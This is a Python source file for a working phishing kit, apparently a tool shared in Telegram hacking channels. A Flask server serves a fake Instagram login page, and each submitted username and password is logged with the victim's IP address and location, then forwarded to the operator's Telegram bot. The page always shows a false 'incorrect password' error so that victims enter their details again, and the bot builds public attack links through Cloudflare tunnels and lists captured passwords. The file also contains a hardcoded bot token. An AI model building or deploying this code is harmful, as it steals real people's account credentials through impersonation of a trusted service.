    import telebot
from flask import Flask, request, redirect, render_template_string
import threading
import os
import subprocess
import re
import requests
import json

# --- [ CONFIGURATION ] ---
API_TOKEN = '8666034301:AAHksgPWYvDYtNLXqsuQpq6ycVErcqnQBAA'
CH_ID = "@ZXINOXHAX"  # Channel username for Force Join
bot = telebot.TeleBot(API_TOKEN)
app = Flask(__name__)

# --- [ BRANDING & STYLE ] ---
BRAND = "@ZXINOXeditz"
DEV = "@I_AM_BATMAN_EDITOR"
HEADER = f"💜 <b>{BRAND} ELITE OS</b> 💜\n"
LINE = "───────────────────────\n"
LOG_FILE = "logs.json"

# Initialize Database
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as f: json.dump([], f)

# --- [ FUNCTIONS ] ---

def is_subscribed(chat_id):
    """Checks if the user has joined the required channel."""
    try:
        status = bot.get_chat_member(CH_ID, chat_id).status
        if status in ['member', 'administrator', 'creator']:
            return True
        return False
    except Exception as e:
        print(f"Join Check Error: {e}")
        return False

def check_vpn(ip):
    """Analyzes IP for VPN/Proxy presence."""
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=proxy,hosting,country,city").json()
        is_vpn = "YES ✅" if resp.get('proxy') or resp.get('hosting') else "NO ❌"
        location = f"{resp.get('city', 'Unknown')}, {resp.get('country', 'Unknown')}"
        return is_vpn, location
    except:
        return "Unknown ⚠️", "Unknown"

# --- [ PHISHING INTERFACE (HTML) ] ---
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram • Login</title>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #0a0a0a; border: 1px solid #7b2cbf; padding: 40px; width: 320px; border-radius: 12px; box-shadow: 0 0 30px rgba(123, 44, 191, 0.4); text-align: center; }
        .logo { font-size: 38px; font-weight: bold; margin-bottom: 5px; background: linear-gradient(to right, #7b2cbf, #9d4edd); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .sub { color: #7b2cbf; font-size: 10px; letter-spacing: 2px; font-weight: bold; margin-bottom: 25px; text-transform: uppercase; }
        .err { border: 1px solid #ed4956; color: #ed4956; padding: 10px; font-size: 13px; margin-bottom: 15px; border-radius: 4px; display: {{ 'block' if error else 'none' }}; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #222; background: #111; color: #fff; border-radius: 4px; box-sizing: border-box; outline: none; }
        input:focus { border-color: #7b2cbf; }
        button { width: 100%; padding: 12px; background: #7b2cbf; border: none; color: #fff; font-weight: bold; border-radius: 4px; margin-top: 15px; cursor: pointer; transition: 0.3s; }
        button:hover { background: #9d4edd; box-shadow: 0 0 15px #7b2cbf; }
        .vpn-note { font-size: 10px; color: #444; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="box">
        <div class="logo">Instagram</div>
        <div class="sub">Secure Login</div>
        <div class="err">The password you entered is incorrect. Please double-check and try again.</div>
        <form method="post">
            <input type="text" name="u" placeholder="Phone, username, or email" required>
            <input type="password" name="p" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="vpn-note">Encrypted via { BRAND } Proxy Tunnel</div>
    </div>
</body>
</html>
'''

@app.route('/<uid>', methods=['GET', 'POST'])
def index(uid):
    error = False
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        ip = request.remote_addr
        vpn_stat, loc = check_vpn(ip)

        # Save to logs
        with open(LOG_FILE, "r+") as f:
            data = json.load(f)
            data.append({"user": u, "pass": p, "ip": ip, "vpn": vpn_stat})
            f.seek(0); json.dump(data, f)

        # Alert the Hacker
        alert = (f"{HEADER}{LINE}"
                 f"👤 <b>VICTIM:</b> <code>{u}</code>\n"
                 f"🔑 <b>PASS:</b> <code>{p}</code>\n"
                 f"🛡️ <b>VPN:</b> {vpn_stat}\n"
                 f"📍 <b>LOC:</b> {loc}\n{LINE}"
                 f"💠 <b>STATUS:</b> Captured successfully ✅")
        bot.send_message(uid, alert, parse_mode='HTML')
        error = True # Psych loop: Always show error
    return render_template_string(HTML_TEMPLATE, error=error, BRAND=BRAND)

# --- [ TELEGRAM BOT LOGIC ] ---

def show_main_menu(message):
    ip = requests.get('https://api.ipify.org').text
    vpn_stat, loc = check_vpn(ip)

    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        telebot.types.InlineKeyboardButton("🚀 DEPLOY ATTACK", callback_data="gen"),
        telebot.types.InlineKeyboardButton("📊 DASHBOARD", callback_data="dash"),
        telebot.types.InlineKeyboardButton("📖 GUIDE", callback_data="guide"),
        telebot.types.InlineKeyboardButton("� WIPE DATA", callback_data="clear")
    )

    msg = (f"{HEADER}{LINE}"
           f"🖥️ <b>SYSTEM STATUS:</b>\n"
           f"🌐 IP: <code>{ip}</code>\n"
           f"🛡️ VPN: {vpn_stat}\n"
           f"📍 LOC: {loc}\n{LINE}"
           f"👑 <b>MASTER:</b> {DEV}")
    bot.send_message(message.chat.id, msg, reply_markup=markup, parse_mode='HTML')

@bot.message_handler(commands=['start'])
def start(message):
    uid = message.chat.id
    if not is_subscribed(uid):
        markup = telebot.types.InlineKeyboardMarkup()
        markup.add(telebot.types.InlineKeyboardButton("📢 JOIN CHANNEL", url=f"https://t.me/{CH_ID.replace('@','')}"))
        markup.add(telebot.types.InlineKeyboardButton("🔄 VERIFY JOIN", callback_data="verify"))

        bot.send_message(uid, f"{HEADER}{LINE}⚠️ <b>ACCESS RESTRICTED!</b>\n\nYou must be a member of our channel to use this premium terminal.", reply_markup=markup, parse_mode='HTML')
        return
    show_main_menu(message)

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    uid = call.message.chat.id
    if call.data == "verify":
        if is_subscribed(uid):
            bot.delete_message(uid, call.message.message_id)
            show_main_menu(call.message)
        else:
            bot.answer_callback_query(call.id, "❌ Join the channel first!", show_alert=True)

    elif call.data == "gen":
        bot.edit_message_text(f"{HEADER}⚙️ <b>INITIALIZING TUNNEL...</b>", uid, call.message.message_id, parse_mode='HTML')
        threading.Thread(target=start_tunnel, args=(str(uid),)).start()

    elif call.data == "dash":
        with open(LOG_FILE, "r") as f: logs = json.load(f)
        if not logs:
            bot.answer_callback_query(call.id, "Database is empty! 📭")
            return
        res = f"{HEADER}<b>📊 CAPTURED DATABASE</b>\n{LINE}"
        for i, entry in enumerate(logs[-10:]): # Show last 10 logs
            res += f"{i+1}. 👤 <code>{entry['user']}</code> | 🔑 <code>{entry['pass']}</code>\n"
        bot.send_message(uid, res, parse_mode='HTML')

    elif call.data == "clear":
        with open(LOG_FILE, "w") as f: json.dump([], f)
        bot.answer_callback_query(call.id, "✅ Database wiped clean!")

    elif call.data == "guide":
        guide = (f"{HEADER}{LINE}"
                 "📘 <b>OPERATIONAL GUIDE:</b>\n"
                 "1. Keep 1.1.1.1 VPN active.\n"
                 "2. Generate link & send to victim.\n"
                 "3. Psychology: User sees error, inputs real data twice.\n"
                 "4. Check 'Dashboard' for results.\n"
                 f"{LINE}🛠️ <b>Architect:</b> {DEV}")
        bot.send_message(uid, guide, parse_mode='HTML')

def start_tunnel(uid):
    os.system("pkill cloudflared")
    proc = subprocess.Popen(['cloudflared', 'tunnel', '--url', 'http://127.0.0.1:5000'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in proc.stdout:
        if "trycloudflare.com" in line:
            link = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", line)
            if link:
                bot.send_message(uid, f"{HEADER}🔗 <b>LIVE ATTACK LINK:</b>\n\n<code>{link.group(0)}/{uid}</code>", parse_mode='HTML')
                break

if __name__ == "__main__":
    # Start Flask Server in background
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, use_reloader=False), daemon=True).start()
    print(f"--- {BRAND} SYSTEM ONLINE ---")
    bot.infinity_polling()
